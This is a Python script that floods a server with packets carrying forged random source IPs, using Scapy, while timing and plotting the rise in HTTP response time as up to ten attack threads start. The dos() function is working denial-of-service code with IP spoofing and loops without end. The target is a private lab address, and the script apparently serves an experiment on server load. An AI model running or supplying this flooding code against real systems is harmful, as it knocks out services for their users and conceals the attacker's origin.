import random

from matplotlib.ticker import MultipleLocator
from scapy.all import *
from scapy.layers.inet import *
import time
import http.client
from queue import Queue
import threading
import matplotlib.pyplot as plt

def dos(server_ip, server_port):
    # Define the source and destination IP addresses and ports
    # start_src_ip = "10.100.102."
    # dest_ip = "10.100.102.19"
    # dest_port = 8000

    # Craft an HTTP GET request packet
    tcp_packet = TCP(dport=server_port, sport=12345)  # Use a source port of your choice
    get_request = (
        "GET / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "\r\n"
    ).format(server_ip)

    while True:
        rand_num1 = int(random.uniform(1, 254))
        rand_num2 = int(random.uniform(1, 254))
        rand_num3 = int(random.uniform(1, 254))
        rand_num4 = int(random.uniform(1, 254))
        # src_ip = start_src_ip+str(rand_num)
        src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
        # print(src_ip)
        ip_packet = IP(src=src_ip, dst=server_ip)

        packet = ip_packet / tcp_packet / get_request

        # Send the packet
        send(packet, verbose=0)


def get_response_time(server_ip, server_port, path="/"):
    try:
        start_time = time.time()

        # Create an HTTP connection
        conn = http.client.HTTPConnection(server_ip, server_port)

        # Send a GET request
        conn.request("GET", path)

        # Get the response
        response = conn.getresponse()

        # Measure the response time
        response_time = (time.time() - start_time) * 1000  # in milliseconds

        # Close the connection
        conn.close()

        return response_time

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def response_time_iterate(server_ip, port, q):
    iter = 0
    avg_iter = 0
    res_sum = 0
    res_avg = 0
    while iter < 100:
        response_time = get_response_time(server_ip, port)
        if response_time is None:
            print("error")
        else:
            # print(f"response time: {response_time}")
            if avg_iter<10:
                res_sum += response_time
                avg_iter += 1
            else:
                res_avg = res_sum/avg_iter
                q.put(res_avg)
                iter += 1
                avg_iter = 0
                res_sum = 0
            time.sleep(0.1)

# dos(1, "10.100.102.19", 8000)
# print(get_response_time("10.100.102.19", 8000))


def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_threads=10, samples_for_avg=10):
    # sample iterations
    iter = 1

    # total number of samples averages
    num_of_samples = (1+num_of_threads) * response_avgs_between_threads

    # iterations to calculate avg of responses
    avg_iter = 0

    # sum of responses to calculate average
    res_sum = 0

    # response time average
    res_avg = 0

    # list of dos threads
    dos_threads = []

    # list of iterations for the graph
    iter_list = []

    # list of response times for the graph
    response_times_list = []

    # initialize dos threads
    for i in range(num_of_threads):
        dos_threads.append(threading.Thread(target=dos, args=(server_ip, server_port), daemon=True))

    while iter < (num_of_samples+1):
        try:
            # calculate response times averages
            while avg_iter < samples_for_avg:
                response_time = get_response_time(server_ip, server_port)
                if response_time is None:
                    print("error")
                else:
                    res_sum += response_time
                    avg_iter += 1
                    time.sleep(1/samples_for_avg)
            res_avg = res_sum / avg_iter
            # reset average variables after calculating the average
            avg_iter = 0
            res_sum = 0
            # append the iteration to the list
            iter_list.append(iter-1)
            # append the response time average to the list
            response_times_list.append(res_avg)
            # print the response time average
            print(f"response time: %.2f" % res_avg)

            # starting dos thread at the required time
            if num_of_samples > iter >= response_avgs_between_threads and iter % response_avgs_between_threads == 0:
                print(f"\n\n\nadd dos thread number {(iter//10)-1}\n\n\n")
                dos_threads[(iter // response_avgs_between_threads) - 1].start()
            iter += 1

        except KeyboardInterrupt:
            break

    print(iter_list)
    print(response_times_list)
    plt.plot(iter_list, response_times_list)

    # naming the time in sec axis
    plt.xlabel('Threads')

    # naming the response time in ms axis
    plt.ylabel('Response time')

    # giving a title to my graph
    plt.title('Server response time depending on threads')

    # Set the x-axis limits to start at 0 and end at 110
    plt.xlim(0, (num_of_samples))

    # Set tick marks on the x-axis at every 10 units
    plt.xticks(range(0, (num_of_samples+1), response_avgs_between_threads))

    # Enable minor ticks at intervals of 0.5 units
    minor_locator = MultipleLocator(1)
    plt.gca().xaxis.set_minor_locator(minor_locator)

    # Create custom labels for the major ticks
    major_tick_locations = range(response_avgs_between_threads, (num_of_threads * response_avgs_between_threads + 1), response_avgs_between_threads)
    major_tick_labels = [f'Th{(loc // response_avgs_between_threads) - 1}' for loc in major_tick_locations]

    # Set major tick marks on the x-axis and apply custom labels
    plt.xticks(major_tick_locations, major_tick_labels)

    plt.grid(which='both', linestyle=':', linewidth=0.5)

    return plt

    # plt.show()


plot = execute("10.100.102.19", 8000)

plot.show()
